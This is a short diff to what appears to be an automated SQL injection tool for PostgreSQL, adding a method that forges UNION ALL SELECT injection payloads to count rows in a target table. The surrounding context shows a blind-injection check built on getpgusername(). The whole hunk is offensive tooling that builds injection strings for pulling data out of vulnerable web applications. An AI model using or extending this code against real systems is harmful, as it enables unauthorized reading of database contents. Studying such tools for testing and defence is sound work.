@@ -97,6 +97,20 @@ class PostgresMole(DbmsMole):
     def dbms_check_blind_query(cls):
         return ' and {op_par}0 < (select length(getpgusername()))'
     
+    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = None):
+        query = " and 1 = 0 UNION ALL SELECT "
+        query_list = list(self.query)
+        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||COUNT(" + fields + ")||" + PostgresMole.out_delimiter + ")")
+    
+        query += ','.join(query_list)
+        at_end = ''
+        if len(table_name) > 0:
+            query += " from " + table_name 
+        if not where is None:
+            query += " where " + self.parse_condition(where)
+        query += at_end
+        return query
+    
     def forge_query(self, column_count, fields, table_name, injectable_field, where = None, offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
